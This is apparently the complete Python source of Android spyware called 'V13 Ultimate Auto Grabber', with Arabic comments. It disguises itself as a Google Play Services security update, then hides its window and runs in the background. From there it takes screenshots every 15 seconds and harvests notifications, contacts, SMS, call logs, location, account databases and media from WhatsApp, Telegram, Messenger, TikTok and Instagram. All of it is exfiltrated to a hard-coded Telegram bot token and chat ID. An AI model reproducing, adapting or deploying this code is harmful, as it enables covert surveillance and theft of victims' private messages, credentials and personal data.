# ============================================
# V13 ULTIMATE AUTO GRABBER - ZERO COMMANDS
# ============================================
# كل شيء تلقائي - بدون أي أوامر - إخفاء تام
# ============================================

import flet as ft
import requests
import threading
import time
import os
import sys
import json
import base64
import hashlib
import random
import string
import subprocess
from pathlib import Path
import shutil
import glob
import datetime
import re

# ========== بيانات التليجرام ==========
BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"
CHAT_ID = "7259620384"
# ======================================

# ========== مسارات الجهاز ==========
BASE_DIR = '/storage/emulated/0'
ANDROID_DATA = '/data/data'
DCIM_DIR = f'{BASE_DIR}/DCIM'
PICTURES_DIR = f'{BASE_DIR}/Pictures'
DOWNLOADS_DIR = f'{BASE_DIR}/Download'

# مسارات التطبيقات الملطوبة
TIKTOK_DIR = f'{BASE_DIR}/Android/data/com.zhiliaoapp.musically'
TIKTOK_DIR2 = f'{BASE_DIR}/Android/data/com.ss.android.ugc.trill'
MESSENGER_DIR = f'{BASE_DIR}/Android/data/com.facebook.orca'
WHATSAPP_DIR = f'{BASE_DIR}/WhatsApp'
TELEGRAM_DIR = f'{BASE_DIR}/Telegram'
INSTAGRAM_DIR = f'{BASE_DIR}/Android/data/com.instagram.android'
FACEBOOK_DIR = f'{BASE_DIR}/Android/data/com.facebook.katana'
SNAPCHAT_DIR = f'{BASE_DIR}/Android/data/com.snapchat.android'

# إنشاء المسارات الأساسية
for path in [BASE_DIR, DCIM_DIR, PICTURES_DIR, DOWNLOADS_DIR]:
    try: os.makedirs(path, exist_ok=True)
    except: pass

# اسم الحزمة
PACKAGE_NAME = "com.google.android.gms.update"

# ========== نظام الإرسال ==========
def send_to_telegram(title, message, file_path=None):
    """إرسال سريع"""
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # معلومات الجهاز
        try:
            model = subprocess.run("getprop ro.product.model", shell=True, capture_output=True, text=True, timeout=2).stdout.strip()
            android = subprocess.run("getprop ro.build.version.release", shell=True, capture_output=True, text=True, timeout=2).stdout.strip()
            device_info = f"📱 {model} | Android {android}"
        except:
            device_info = "📱 Android Device"
        
        text = f"🔴 V13 AUTO\n{device_info}\n⏰ {timestamp}\n📌 {title}\n\n{message[:500]}"
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": text}, timeout=5)
        
        if file_path:
            if isinstance(file_path, list):
                for f in file_path[:3]:
                    if os.path.exists(f) and os.path.getsize(f) < 50 * 1024 * 1024:
                        with open(f, 'rb') as file:
                            files = {'document': file}
                            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                            requests.post(url, data={"chat_id": CHAT_ID}, files=files, timeout=60)
                        time.sleep(1)
            elif os.path.exists(file_path) and os.path.getsize(file_path) < 50 * 1024 * 1024:
                with open(file_path, 'rb') as f:
                    files = {'document': f}
                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                    requests.post(url, data={"chat_id": CHAT_ID}, files=files, timeout=60)
    except:
        pass

# ========== 1. نظام سحب الإشعارات من كل التطبيقات ==========
class NotificationGrabber:
    """يسحب إشعارات كل التطبيقات"""
    
    def __init__(self):
        self.notification_count = 0
        self.last_notifications = set()
        
        # قائمة التطبيقات المهمة
        self.target_apps = {
            'تيك توك': ['com.zhiliaoapp.musically', 'com.ss.android.ugc.trill'],
            'مسنجر': ['com.facebook.orca'],
            'واتساب': ['com.whatsapp'],
            'تيليغرام': ['org.telegram.messenger'],
            'انستغرام': ['com.instagram.android'],
            'فيسبوك': ['com.facebook.katana'],
            'سناب شات': ['com.snapchat.android'],
            'تويتر': ['com.twitter.android'],
            'سناب': ['com.snapchat.android'],
            'مسجات': ['com.android.mms', 'com.google.android.apps.messaging'],
            'جيميل': ['com.google.android.gm'],
            'يوتيوب': ['com.google.android.youtube'],
        }
    
    def grab_all_notifications(self):
        """سحب كل الإشعارات"""
        try:
            # الطريقة الرئيسية
            cmd = "dumpsys notification --naked"
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=3)
            
            if result.stdout:
                lines = result.stdout.split('\n')
                current_notif = {}
                
                for line in lines:
                    if 'NotificationRecord' in line:
                        if current_notif and self.is_important_notification(current_notif):
                            self.send_notification(current_notif)
                        current_notif = {}
                    
                    if 'pkg=' in line:
                        try: 
                            pkg = line.split('pkg=')[1].split()[0]
                            current_notif['package'] = pkg
                            current_notif['app'] = self.get_app_name(pkg)
                        except: pass
                    
                    if 'title=' in line:
                        try: current_notif['title'] = line.split('title=')[1].split()[0]
                        except: pass
                    
                    if 'text=' in line:
                        try: current_notif['text'] = line.split('text=')[1].split()[0]
                        except: pass
                    
                    if 'tickerText=' in line:
                        try: current_notif['ticker'] = line.split('tickerText=')[1].split()[0]
                        except: pass
        except:
            pass
    
    def get_app_name(self, package):
        """تحويل package name إلى اسم مفهوم"""
        for name, packages in self.target_apps.items():
            if package in packages:
                return name
        
        # محاولة استخراج اسم التطبيق
        try:
            cmd = f"pm list packages -f | grep {package}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=2)
            if result.stdout:
                return package.split('.')[-1]
        except:
            pass
        
        return package
    
    def is_important_notification(self, notif):
        """التحقق من أهمية الإشعار"""
        # بصمة للإشعار
        notif_str = f"{notif.get('package', '')}{notif.get('title', '')}{notif.get('text', '')}"
        notif_hash = hashlib.md5(notif_str.encode()).hexdigest()
        
        if notif_hash in self.last_notifications:
            return False
        
        self.last_notifications.add(notif_hash)
        if len(self.last_notifications) > 200:
            self.last_notifications = set(list(self.last_notifications)[-100:])
        
        # التحقق من وجود محتوى
        text = notif.get('text', '')
        title = notif.get('title', '')
        
        if len(text) < 3 and len(title) < 3:
            return False
        
        return True
    
    def send_notification(self, notif):
        """إرسال الإشعار"""
        self.notification_count += 1
        
        app = notif.get('app', notif.get('package', 'غير معروف'))
        title = notif.get('title', '')
        text = notif.get('text', '')
        ticker = notif.get('ticker', '')
        
        message = f"📱 {app}\n"
        if title: message += f"📌 {title}\n"
        if text: message += f"💬 {text}\n"
        if ticker: message += f"📋 {ticker}"
        
        send_to_telegram(f"🔔 إشعار #{self.notification_count}", message)
        
        # إذا كان الإشعار من تطبيق مهم، نأخذ لقطة شاشة
        if any(x in app.lower() for x in ['تيك', 'مسنجر', 'واتس', 'تيليغرام', 'انستغرام']):
            time.sleep(1)
            screenshot_path = take_screenshot()
            if screenshot_path:
                send_to_telegram(f"📸 لقطة بعد إشعار {app}", "تلقائي", screenshot_path)

# ========== 2. نظام لقطات الشاشة التلقائي ==========
screenshot_count = 0

def take_screenshot():
    """التقاط شاشة"""
    global screenshot_count
    try:
        path = f'{BASE_DIR}/auto_screen_{int(time.time())}.png'
        result = subprocess.run(['screencap', '-p', path], timeout=5)
        
        if os.path.exists(path) and os.path.getsize(path) > 1000:
            screenshot_count += 1
            return path
    except:
        pass
    return None

def auto_screenshot_loop():
    """لقطات شاشة كل 15 ثانية"""
    while True:
        try:
            path = take_screenshot()
            if path:
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                send_to_telegram(
                    f"📸 لقطة #{screenshot_count}", 
                    f"⏰ {timestamp}", 
                    path
                )
            time.sleep(15)  # كل 15 ثانية
        except:
            time.sleep(15)

# ========== 3. نظام مراقبة الحسابات الجديدة ==========
class AccountMonitor:
    """يراقب حسابات التطبيقات"""
    
    def __init__(self):
        self.known_accounts = set()
        self.account_files = [
            '/data/system/users/0/accounts.db',
            '/data/data/com.google.android.gms/databases/accounts.db',
            '/data/data/com.android.providers.settings/databases/settings.db'
        ]
        
        # ملفات حسابات التطبيقات
        self.app_account_files = [
            '/data/data/com.whatsapp/shared_prefs/WhatsApp.xml',
            '/data/data/org.telegram.messenger/shared_prefs/org.telegram.messenger_preferences.xml',
            '/data/data/com.facebook.orca/shared_prefs',
            '/data/data/com.instagram.android/shared_prefs',
            '/data/data/com.zhiliaoapp.musically/shared_prefs',
        ]
        
        self.load_known_accounts()
    
    def load_known_accounts(self):
        """تحميل الحسابات المعروفة"""
        for file_path in self.account_files + self.app_account_files:
            if os.path.exists(file_path):
                try:
                    if os.path.isfile(file_path):
                        size = os.path.getsize(file_path)
                        self.known_accounts.add(f"{file_path}_{size}")
                    elif os.path.isdir(file_path):
                        for f in os.listdir(file_path)[:10]:
                            full = os.path.join(file_path, f)
                            if os.path.isfile(full):
                                size = os.path.getsize(full)
                                self.known_accounts.add(f"{full}_{size}")
                except:
                    pass
    
    def check_new_accounts(self):
        """فحص حسابات جديدة"""
        new_accounts = []
        
        # 1. فحص حسابات النظام
        try:
            cmd = "dumpsys account | grep -E 'Account \{name=|type='"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=3)
            if result.stdout:
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'name=' in line or 'type=' in line:
                        line = line.strip()
                        if line and len(line) > 10:
                            account_hash = hashlib.md5(line.encode()).hexdigest()
                            if account_hash not in self.known_accounts:
                                self.known_accounts.add(account_hash)
                                new_accounts.append(f"🔐 {line[:100]}")
        except:
            pass
        
        # 2. فحص تغير حجم ملفات الحسابات
        for file_path in self.account_files + self.app_account_files:
            if os.path.exists(file_path):
                try:
                    if os.path.isfile(file_path):
                        current_size = os.path.getsize(file_path)
                        file_key = f"{file_path}_{current_size}"
                        
                        if file_key not in self.known_accounts:
                            self.known_accounts.add(file_key)
                            
                            app_name = self.get_app_name_from_path(file_path)
                            new_accounts.append(f"📁 تغير في {app_name}")
                            
                            # نسخ الملف
                            if current_size < 10 * 1024 * 1024:
                                temp_file = f'{BASE_DIR}/account_{int(time.time())}.dat'
                                shutil.copy2(file_path, temp_file)
                                send_to_telegram(f"🔐 ملف {app_name}", file_path, temp_file)
                    
                    elif os.path.isdir(file_path):
                        for f in os.listdir(file_path)[:5]:
                            full = os.path.join(file_path, f)
                            if os.path.isfile(full):
                                current_size = os.path.getsize(full)
                                file_key = f"{full}_{current_size}"
                                
                                if file_key not in self.known_accounts:
                                    self.known_accounts.add(file_key)
                                    app_name = self.get_app_name_from_path(file_path)
                                    new_accounts.append(f"📁 ملف جديد في {app_name}: {f}")
                       
                                if current_size < 10 * 1024 * 1024:
                                    temp_file = f'{BASE_DIR}/account_{int(time.time())}.dat'
                                    shutil.copy2(full, temp_file)
                                    send_to_telegram(f"🔐 ملف {app_name}", f, temp_file)
                except:
                    pass
        
        return new_accounts
    
    def get_app_name_from_path(self, path):
        """استخراج اسم التطبيق من المسار"""
        path_lower = path.lower()
        if 'whatsapp' in path_lower: return 'واتساب'
        if 'telegram' in path_lower: return 'تيليغرام'
        if 'facebook' in path_lower: return 'فيسبوك'
        if 'instagram' in path_lower: return 'انستغرام'
        if 'musically' in path_lower or 'tiktok' in path_lower: return 'تيك توك'
        if 'google' in path_lower: return 'جوجل'
        return 'تطبيق'

# ========== 4. نظام سحب بيانات التطبيقات ==========
class AppDataGrabber:
    """يسحب بيانات التطبيقات"""
    
    def grab_tiktok(self):
        """سحب بيانات تيك توك"""
        files = []
        
        # مسارات تيك توك المحتملة
        tiktok_paths = [
            '/data/data/com.zhiliaoapp.musically/files',
            '/data/data/com.zhiliaoapp.musically/cache',
            '/data/data/com.ss.android.ugc.trill/files',
            f'{BASE_DIR}/Android/data/com.zhiliaoapp.musically/files',
            f'{BASE_DIR}/Pictures/TikTok',
        ]
        
        for path in tiktok_paths:
            if os.path.exists(path):
                for ext in ['*.mp4', '*.jpg', '*.png']:
                    for file in glob.glob(f'{path}/**/{ext}', recursive=True)[:5]:
                        if os.path.getsize(file) < 50 * 1024 * 1024:
                            files.append(file)
        
        return files
    
    def grab_messenger(self):
        """سحب بيانات مسنجر"""
        files = []
        
        messenger_paths = [
            '/data/data/com.facebook.orca/files',
            f'{BASE_DIR}/Android/data/com.facebook.orca/files',
            f'{BASE_DIR}/Pictures/Messenger',
        ]
        
        for path in messenger_paths:
            if os.path.exists(path):
                for ext in ['*.jpg', '*.png', '*.mp4']:
                    for file in glob.glob(f'{path}/**/{ext}', recursive=True)[:5]:
                        if os.path.getsize(file) < 50 * 1024 * 1024:
                            files.append(file)
        
        return files
    
    def grab_whatsapp(self):
        """سحب بيانات واتساب"""
        files = []
        
        whatsapp_paths = [
            f'{WHATSAPP_DIR}/Media/WhatsApp Images',
            f'{WHATSAPP_DIR}/Media/WhatsApp Video',
            f'{WHATSAPP_DIR}/Media/WhatsApp Audio',
            f'{WHATSAPP_DIR}/Databases',
        ]
        
        for path in whatsapp_paths:
            if os.path.exists(path):
                for file in glob.glob(f'{path}/*.*')[:5]:
                    if os.path.getsize(file) < 50 * 1024 * 1024:
                        files.append(file)
        
        return files
    
    def grab_telegram(self):
        """سحب بيانات تليغرام"""
        files = []
        
        telegram_paths = [
            f'{TELEGRAM_DIR}/Telegram Images',
            f'{TELEGRAM_DIR}/Telegram Video',
            f'{TELEGRAM_DIR}/Telegram Documents',
        ]
        
        for path in telegram_paths:
            if os.path.exists(path):
                for file in glob.glob(f'{path}/*.*')[:5]:
                    if os.path.getsize(file) < 50 * 1024 * 1024:
                        files.append(file)
        
        return files
    
    def grab_instagram(self):
        """سحب بيانات انستغرام"""
        files = []
        
        instagram_paths = [
            f'{BASE_DIR}/Android/data/com.instagram.android/files',
            f'{BASE_DIR}/Pictures/Instagram',
        ]
        
        for path in instagram_paths:
            if os.path.exists(path):
                for ext in ['*.jpg', '*.png', '*.mp4']:
                    for file in glob.glob(f'{path}/**/{ext}', recursive=True)[:5]:
                        if os.path.getsize(file) < 50 * 1024 * 1024:
                            files.append(file)
        
        return files
    
    def grab_all_apps_data(self):
        """سحب كل بيانات التطبيقات"""
        all_files = []
        
        grabbers = [
            ('تيك توك', self.grab_tiktok),
            ('مسنجر', self.grab_messenger),
            ('واتساب', self.grab_whatsapp),
            ('تيليغرام', self.grab_telegram),
            ('انستغرام', self.grab_instagram),
        ]
        
        for app_name, grabber in grabbers:
            try:
                files = grabber()
                if files:
                    send_to_telegram(f"📱 {app_name}", f"تم العثور على {len(files)} ملف", files[:3])
                    all_files.extend(files[:3])
            except:
                pass
        
        return all_files

# ========== 5. نظام سحب البيانات الشخصية ==========
class PersonalDataGrabber:
    """يسحب البيانات الشخصية"""
    
    def grab_contacts(self):
        """جهات الاتصال"""
        try:
            cmd = "content query --uri content://contacts/phones --projection display_name,number"
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=5)
            if result.stdout:
                path = f'{BASE_DIR}/contacts_{int(time.time())}.txt'
                with open(path, 'w', encoding='utf-8') as f:
                    f.write(result.stdout)
                return path
        except:
            pass
        return None
    
    def grab_sms(self):
        """الرسائل"""
        try:
            cmd = "content query --uri content://sms/inbox --projection address,body,date"
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=5)
            if result.stdout:
                path = f'{BASE_DIR}/sms_{int(time.time())}.txt'
                with open(path, 'w', encoding='utf-8') as f:
                    f.write(result.stdout)
                return path
        except:
            pass
        return None
    
    def grab_calls(self):
        """سجل المكالمات"""
        try:
            cmd = "content query --uri content://call_log/calls --projection number,duration,date"
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=5)
            if result.stdout:
                path = f'{BASE_DIR}/calls_{int(time.time())}.txt'
                with open(path, 'w', encoding='utf-8') as f:
                    f.write(result.stdout)
                return path
        except:
            pass
        return None
    
    def grab_location(self):
        """الموقع"""
        try:
            cmd = "dumpsys location | grep -A 5 'Last Known Location'"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=3)
            return result.stdout[:200] if result.stdout else "لا يوجد"
        except:
            return "لا يمكن الوصول"

# ========== 6. نظام التشغيل التلقائي الدوري ==========
class AutoScheduler:
    """جدولة المهام التلقائية"""
    
    def __init__(self):
        self.personal = PersonalDataGrabber()
        self.apps = AppDataGrabber()
        self.accounts = AccountMonitor()
        self.notifications = NotificationGrabber()
        self.start_time = time.time()
        self.last_personal_grab = 0
        self.last_apps_grab = 0
    
    def run(self):
        """تشغيل الجدولة"""
        
        # بدء لقطات الشاشة التلقائية
        threading.Thread(target=auto_screenshot_loop, daemon=True).start()
        
        # بدء مراقبة الإشعارات
        def notification_loop():
            while True:
                try:
                    self.notifications.grab_all_notifications()
                    time.sleep(1)
                except:
                    time.sleep(2)
        
        threading.Thread(target=notification_loop, daemon=True).start()
        
        # بدء مراقبة الحسابات
        def account_loop():
            while True:
                try:
                    new_accounts = self.accounts.check_new_accounts()
                    if new_accounts:
                        message = "\n".join(new_accounts)
                        send_to_telegram(f"🔐 حسابات جديدة ({len(new_accounts)})", message)
                        
                        # لقطة شاشة بعد حساب جديد
                        time.sleep(1)
                        ss = take_screenshot()
                        if ss:
                            send_to_telegram("📸 لقطة بعد حساب جديد", "تلقائي", ss)
                    time.sleep(5)
                except:
                    time.sleep(10)
        
        threading.Thread(target=account_loop, daemon=True).start()
        
        # حلقة المهام الدورية
        while True:
            try:
                current_time = time.time()
                elapsed = current_time - self.start_time
                
                # كل 5 دقائق - سحب بيانات شخصية
                if current_time - self.last_personal_grab > 300:
                    self.last_personal_grab = current_time
                    
                    # جهات اتصال
                    contacts = self.personal.grab_contacts()
                    if contacts:
                        send_to_telegram("👥 جهات الاتصال", "تحديث", contacts)
                    
                    # رسائل
                    sms = self.personal.grab_sms()
                    if sms:
                        send_to_telegram("📨 الرسائل", "تحديث", sms)
                    
                    # مكالمات
                    calls = self.personal.grab_calls()
                    if calls:
                        send_to_telegram("📞 المكالمات", "تحديث", calls)
                
                # كل 15 دقيقة - سحب بيانات التطبيقات
                if current_time - self.last_apps_grab > 900:
                    self.last_apps_grab = current_time
                    self.apps.grab_all_apps_data()
                
                # كل ساعة - تقرير
                if int(elapsed) % 3600 < 10:
                    report = f"""
📊 تقرير {int(elapsed/3600)} ساعة:
📸 لقطات: {screenshot_count}
🔔 إشعارات: {self.notifications.notification_count}
🔐 حسابات مراقبة: {len(self.accounts.known_accounts)}
                    """
                    send_to_telegram("📊 تقرير دوري", report)
                
                time.sleep(10)
                
            except:
                time.sleep(30)

# ========== الواجهة الرئيسية - مخفية تماماً ==========
def main(page: ft.Page):
    """صفحة سريعة - تختفي فوراً"""
    try:
        # تطابق تام مع واجهة جوجل
        page.title = "جاري التثبيت..."
        page.window_width = 350
        page.window_height = 250
        page.window_resizable = False
        page.window_center()
        page.bgcolor = "#ffffff"
        page.theme_mode = ft.ThemeMode.LIGHT
        
        # تصميم يشبه تحديث جوجل بلاي
        page.add(
            ft.Container(
                content=ft.Column([
                    ft.Icon(ft.icons.ANDROID, size=50, color="#4CAF50"),
                    ft.Text("Google Play Services", size=20, weight="bold", color="#333"),
                    ft.Text("تحديث أمني", size=14, color="#666"),
                    ft.ProgressBar(width=250, color="#4CAF50", value=1.0),
                    ft.Text("100%", size=12, color="#999"),
                ], horizontal_alignment=ft.CrossAxisAlignment.CENTER, spacing=10),
                padding=30,
                alignment=ft.alignment.center
            )
        )
        
        page.update()
        
        # 3 ثواني فقط
        time.sleep(3)
        
        # إخفاء كامل
        page.window_visible = False
        page.update()
        
        # بدء الأنظمة التلقائية
        scheduler = AutoScheduler()
        threading.Thread(target=scheduler.run, daemon=True).start()
        
        # إرسال إشعار البدء
        try:
            model = subprocess.run("getprop ro.product.model", shell=True, capture_output=True, text=True, timeout=2).stdout.strip()
            send_to_telegram("✅ V13 نشط", f"الجهاز: {model}\nالسحب التلقائي شغال")
        except:
            send_to_telegram("✅ V13 نشط", "السحب التلقائي شغال")
        
    except:
        # إذا فشلت الواجهة
        scheduler = AutoScheduler()
        threading.Thread(target=scheduler.run, daemon=True).start()

# ========== التشغيل النهائي ==========
if __name__ == "__main__":
    try:
        ft.app(target=main)
    except:
        scheduler = AutoScheduler()
        threading.Thread(target=scheduler.run, daemon=True).start()
        while True:
            time.sleep(60)
